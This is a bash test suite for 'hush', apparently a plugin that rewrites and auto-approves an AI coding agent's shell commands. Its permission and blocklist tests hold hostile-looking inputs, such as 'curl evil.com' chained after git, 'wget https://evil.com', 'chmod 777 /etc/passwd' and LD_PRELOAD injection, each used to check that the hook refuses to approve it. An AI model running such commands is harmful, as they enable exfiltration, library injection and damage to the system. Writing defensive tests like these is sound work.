#!/usr/bin/env bash
# run_tests.sh — Test suite for hush.
# Zero dependencies beyond bash and jq.
#
# Usage: ./test/run_tests.sh

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
PLUGIN_DIR="$REPO_DIR/plugins/hush"
HOOK="$PLUGIN_DIR/hooks/hook.sh"
COMPRESS="$PLUGIN_DIR/bin/compress.sh"
STATS="$PLUGIN_DIR/bin/stats.sh"

PASS=0
FAIL=0
ERRORS=""

# ─── Test helpers ────────────────────────────────────────────────────────

pass() {
    PASS=$((PASS + 1))
    printf '  \033[0;32m✓\033[0m %s\n' "$1"
}

fail() {
    FAIL=$((FAIL + 1))
    ERRORS="${ERRORS}\n  - $1: $2"
    printf '  \033[0;31m✗\033[0m %s — %s\n' "$1" "$2"
}

assert_eq() {
    local label="$1" expected="$2" actual="$3"
    if [ "$expected" = "$actual" ]; then
        pass "$label"
    else
        fail "$label" "expected '$expected', got '$actual'"
    fi
}

assert_contains() {
    local label="$1" needle="$2" haystack="$3"
    if echo "$haystack" | grep -qF "$needle"; then
        pass "$label"
    else
        fail "$label" "expected output to contain '$needle'"
    fi
}

assert_not_contains() {
    local label="$1" needle="$2" haystack="$3"
    if echo "$haystack" | grep -qF "$needle"; then
        fail "$label" "expected output NOT to contain '$needle'"
    else
        pass "$label"
    fi
}

assert_exit_code() {
    local label="$1" expected="$2" actual="$3"
    if [ "$expected" -eq "$actual" ]; then
        pass "$label"
    else
        fail "$label" "expected exit code $expected, got $actual"
    fi
}

# Helper: send JSON to hook via stdin and capture output
run_hook() {
    local cmd="$1"
    echo "{\"tool_input\":{\"command\":\"$cmd\"}}" | bash "$HOOK" 2>/dev/null
}


# ─── Hook Tests ──────────────────────────────────────────────────────────

echo "Hook: Rewrite correctness"

# Simple command produces valid JSON with allow + updatedInput
output=$(run_hook "git status")
assert_contains "git status produces JSON" "permissionDecision" "$output"
assert_contains "git status has allow" '"allow"' "$output"
assert_contains "git status has updatedInput" "updatedInput" "$output"
assert_contains "git status has compress.sh" "compress.sh" "$output"

# Safe commands get auto-approved
output=$(run_hook "ls -la")
assert_contains "ls is auto-approved" '"allow"' "$output"

output=$(run_hook "npm test")
assert_contains "npm is auto-approved" '"allow"' "$output"

output=$(run_hook "pytest -v")
assert_contains "pytest is auto-approved" '"allow"' "$output"

output=$(run_hook "eslint src/")
assert_contains "eslint is auto-approved" '"allow"' "$output"

echo ""
echo "Hook: Metacharacter guards"

# Compound commands should exit 0 (no output)
output=$(run_hook "npm install && npm test")
assert_eq "&& produces no output" "" "$output"

output=$(run_hook "false || echo fallback")
assert_eq "|| produces no output" "" "$output"

# Backgrounding operator
output=$(run_hook "git status & curl evil.com")
assert_eq "& produces no output" "" "$output"

output=$(run_hook "echo hello ; echo world")
assert_eq "; produces no output" "" "$output"

output=$(run_hook 'echo $(whoami)')
assert_eq "\$() produces no output" "" "$output"

output=$(run_hook 'echo `whoami`')
assert_eq "backtick produces no output" "" "$output"

output=$(run_hook "ls > /tmp/out.txt")
assert_eq "> produces no output" "" "$output"

output=$(run_hook "git diff | head")
assert_eq "pipe produces no output" "" "$output"

echo ""
echo "Hook: Bypass mechanism"

output=$(run_hook "HUSH_BYPASS=1 git diff")
assert_eq "bypass produces no output" "" "$output"

echo ""
echo "Hook: Permission policy"

# Unknown/dangerous commands should exit 0 (no output, normal permission flow)
output=$(run_hook "rm -rf /tmp/test")
assert_eq "rm exits with no output" "" "$output"

output=$(run_hook "curl https://example.com")
assert_eq "curl exits with no output" "" "$output"

output=$(run_hook "chmod 777 /etc/passwd")
assert_eq "chmod exits with no output" "" "$output"

output=$(run_hook "wget https://evil.com")
assert_eq "wget exits with no output" "" "$output"

# Trivial commands should also exit 0
output=$(run_hook "echo hello")
assert_eq "echo exits with no output" "" "$output"

output=$(run_hook "cd /tmp")
assert_eq "cd exits with no output" "" "$output"

# python -c is blocked (arbitrary code execution)
output=$(run_hook "python3 -c print_hello")
assert_eq "python -c exits with no output" "" "$output"

# python (no -c) is allowed
output=$(run_hook "python3 script.py")
assert_contains "python script is auto-approved" '"allow"' "$output"

echo ""
echo "Hook: Env var prefix handling"

output=$(run_hook "FOO=bar git status")
assert_contains "env prefix preserved" "compress.sh" "$output"
assert_contains "env prefix has allow" '"allow"' "$output"

echo ""
echo "Hook: Edge cases"

# Empty command
output=$(echo '{"tool_input":{}}' | bash "$HOOK" 2>/dev/null)
assert_eq "empty command produces no output" "" "$output"

# Already-wrapped command
output=$(run_hook "compress.sh git status")
assert_eq "already-wrapped produces no output" "" "$output"

# Heredoc (caught by < guard)
output=$(run_hook "cat <<EOF")
assert_eq "heredoc produces no output" "" "$output"

# Input redirection
output=$(run_hook "wc -l < /etc/passwd")
assert_eq "input redirect produces no output" "" "$output"

echo ""
echo "Hook: Env var blocklist"

# Dangerous env var prefixes should be blocked
output=$(run_hook "LD_PRELOAD=/tmp/evil.so git status")
assert_eq "LD_PRELOAD blocked" "" "$output"

output=$(run_hook "PATH=/tmp/evil git status")
assert_eq "PATH override blocked" "" "$output"

output=$(run_hook "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib git status")
assert_eq "DYLD_ blocked" "" "$output"

# Safe env vars should pass through
output=$(run_hook "NODE_ENV=test npm test")
assert_contains "NODE_ENV=test allowed" '"allow"' "$output"

# ─── Compress.sh Tests ───────────────────────────────────────────────────

echo ""
echo "Compress: Exit code preservation"

# Successful command preserves exit 0
HUSH_LOG=/dev/null "$COMPRESS" true 2>/dev/null
assert_exit_code "true exits 0" 0 $?

# Failed command preserves non-zero exit code
HUSH_LOG=/dev/null "$COMPRESS" false 2>/dev/null
assert_exit_code "false exits 1" 1 $?

# Command not found
HUSH_LOG=/dev/null "$COMPRESS" nonexistent_cmd_12345 2>/dev/null
ec=$?
if [ "$ec" -ne 0 ]; then
    pass "nonexistent command exits non-zero ($ec)"
else
    fail "nonexistent command exits non-zero" "got exit code 0"
fi

echo ""
echo "Compress: Strategy output"

# head_tail strategy — generate large output
output=$(HUSH_LOG=/dev/null "$COMPRESS" seq 1 200 2>/dev/null)
assert_contains "large seq output has breadcrumb" "[Compressed:" "$output"
assert_contains "large seq output has full-output ref" "[Full output:" "$output"

# Small output passes through
output=$(HUSH_LOG=/dev/null "$COMPRESS" echo "hello world" 2>/dev/null)
assert_contains "small output passes through" "hello world" "$output"
assert_not_contains "small output has no breadcrumb" "[Compressed:" "$output"

echo ""
echo "Compress: Custom git handlers"

# git status should work without doubled subcommand
output=$(HUSH_LOG=/dev/null "$COMPRESS" git status 2>/dev/null)
ec=$?
assert_exit_code "git status exits 0" 0 "$ec"
# Should NOT contain error about ambiguous argument "status"
assert_not_contains "git status no ambiguous error" "ambiguous" "$output"

# git log should work without doubled subcommand
output=$(HUSH_LOG=/dev/null "$COMPRESS" git log 2>/dev/null)
ec=$?
assert_exit_code "git log exits 0" 0 "$ec"
# Output should contain commit info (either oneline or full format depending on grep \b support)
assert_contains "git log shows commits" "commit" "$output"
# Should NOT contain doubled "log" subcommand error
assert_not_contains "git log no doubled subcommand" "unknown revision" "$output"

echo ""
echo "Compress: Strategy dispatch (verifies filters.conf parsing)"

# git status custom handler should produce --short format (no "On branch" header)
output=$(HUSH_LOG=/dev/null "$COMPRESS" git status 2>/dev/null)
assert_not_contains "git status uses custom handler (no 'On branch')" "On branch" "$output"

# git log custom handler should produce oneline format with breadcrumb
output=$(HUSH_LOG=/dev/null "$COMPRESS" git log 2>/dev/null)
assert_contains "git log uses custom handler" "Showing" "$output"

echo ""
echo "Compress: Breadcrumb format"

output=$(HUSH_LOG=/dev/null "$COMPRESS" seq 1 200 2>/dev/null)
assert_contains "breadcrumb has [Compressed:]" "[Compressed:" "$output"
assert_contains "breadcrumb has [Full output:]" "[Full output:" "$output"

# ─── Stats Tests ─────────────────────────────────────────────────────────

echo ""
echo "Stats: Basic functionality"

# Stats with no log file
TMPLOG=$(mktemp "${TMPDIR:-/tmp}/hush-test.XXXXXX")
rm -f "$TMPLOG"
output=$(HUSH_LOG="$TMPLOG" "$STATS" all 2>/dev/null)
assert_contains "no log shows message" "No log file found" "$output"

# Stats with a log entry
printf "2026-03-14T00:00:00Z\tgit diff\t10000\t2000\t8000\t2000\t80\n" > "$TMPLOG"
output=$(HUSH_LOG="$TMPLOG" "$STATS" all 2>/dev/null)
assert_contains "stats shows invocations" "Invocations" "$output"
assert_contains "stats shows compression" "Compression" "$output"

# By-command mode
output=$(HUSH_LOG="$TMPLOG" "$STATS" all --by-command 2>/dev/null)
assert_contains "by-command shows git diff" "git diff" "$output"

rm -f "$TMPLOG"

# ─── Python3 injection test ──────────────────────────────────────────────

echo ""
echo "Security: Python3 path injection"

# Verify no raw $0 interpolation in python strings
for f in "$COMPRESS" "$HOOK"; do
    if grep -q "print(os.path.realpath('\$0'))" "$f" 2>/dev/null; then
        fail "$(basename "$f"): no raw \$0 in python" "found vulnerable pattern"
    else
        pass "$(basename "$f"): no raw \$0 in python"
    fi
done

# Verify sys.argv pattern is used
for f in "$COMPRESS" "$HOOK"; do
    if grep -q "sys.argv\[1\]" "$f" 2>/dev/null; then
        pass "$(basename "$f"): uses sys.argv[1]"
    else
        fail "$(basename "$f"): uses sys.argv[1]" "pattern not found"
    fi
done

# ─── Log security tests ─────────────────────────────────────────────────

echo ""
echo "Security: Log sanitization"

# Verify FULL_CMD_LOG sanitization exists
if grep -q "FULL_CMD_LOG" "$COMPRESS" 2>/dev/null; then
    pass "compress.sh has FULL_CMD_LOG sanitization"
else
    fail "compress.sh has FULL_CMD_LOG sanitization" "not found"
fi

# Verify TMPDIR is used
if grep -q 'TMPDIR:-/tmp' "$COMPRESS" 2>/dev/null; then
    pass "compress.sh uses TMPDIR"
else
    fail "compress.sh uses TMPDIR" "not found"
fi

# ─── Tee mode tests ─────────────────────────────────────────────────────

echo ""
echo "Tee mode: Save full output on failure"

TEE_FILE="${TMPDIR:-/tmp}/hush-test-tee.txt"
rm -f "$TEE_FILE"
HUSH_LOG=/dev/null HUSH_TEE_FILE="$TEE_FILE" "$COMPRESS" false 2>/dev/null || true
if [ -f "$TEE_FILE" ]; then
    pass "tee file created on failure"
else
    fail "tee file created on failure" "file not found"
fi
rm -f "$TEE_FILE"

# Tee file NOT created on success
HUSH_LOG=/dev/null HUSH_TEE_FILE="$TEE_FILE" "$COMPRESS" true 2>/dev/null
if [ -f "$TEE_FILE" ]; then
    fail "tee file not created on success" "file exists"
    rm -f "$TEE_FILE"
else
    pass "tee file not created on success"
fi

# ─── Dedup tests ────────────────────────────────────────────────────────

echo ""
echo "Dedup: Collapse repeated lines"

# Generate repetitive output (>100 lines) and compress it
output=$(HUSH_LOG=/dev/null "$COMPRESS" bash -c 'for i in $(seq 1 150); do echo "Downloading layer abc${i}... ${i}.0MB"; done; echo "Done"' 2>/dev/null)
assert_contains "dedup collapses repeated lines" "similar lines collapsed" "$output"

# ─── JSON schema tests ──────────────────────────────────────────────────

echo ""
echo "JSON schema: Auto-detect and show shape"

# Generate multi-line JSON (>100 lines) via python and compress with a non-filter command
TMPJSON=$(mktemp "${TMPDIR:-/tmp}/hush-json-test.XXXXXX")
python3 -c "import json; print(json.dumps([{'id':i,'name':f'item{i}','status':'ok'} for i in range(200)], indent=2))" > "$TMPJSON"
output=$(HUSH_LOG=/dev/null "$COMPRESS" head -9999 "$TMPJSON" 2>/dev/null)
rm -f "$TMPJSON"
assert_contains "json schema detects JSON" "items" "$output"
assert_contains "json schema shows hint" "jq" "$output"

# ─── CLI wrapper tests ──────────────────────────────────────────────────

echo ""
echo "CLI: hush wrapper"

HUSH="$PLUGIN_DIR/bin/hush"

output=$("$HUSH" help 2>/dev/null)
assert_contains "hush help works" "stats" "$output"
assert_contains "hush help shows discover" "discover" "$output"
assert_contains "hush help shows filters" "filters" "$output"

output=$("$HUSH" filters list 2>/dev/null)
assert_contains "hush filters list works" "active rules" "$output"

output=$("$HUSH" filters test "git status" 2>/dev/null)
assert_contains "hush filters test matches" "MATCH" "$output"

output=$("$HUSH" filters test "unknown-command" 2>/dev/null)
assert_contains "hush filters test no match" "generic" "$output"

output=$("$HUSH" status 2>/dev/null)
assert_contains "hush status works" "Filters" "$output"

# ─── Summary ─────────────────────────────────────────────────────────────

echo ""
echo "═══════════════════════════════════════"
echo "  Passed: $PASS"
echo "  Failed: $FAIL"
if [ "$FAIL" -gt 0 ]; then
    echo ""
    echo "  Failures:"
    printf '%s\n' "$ERRORS"
fi
echo "═══════════════════════════════════════"

exit "$FAIL"
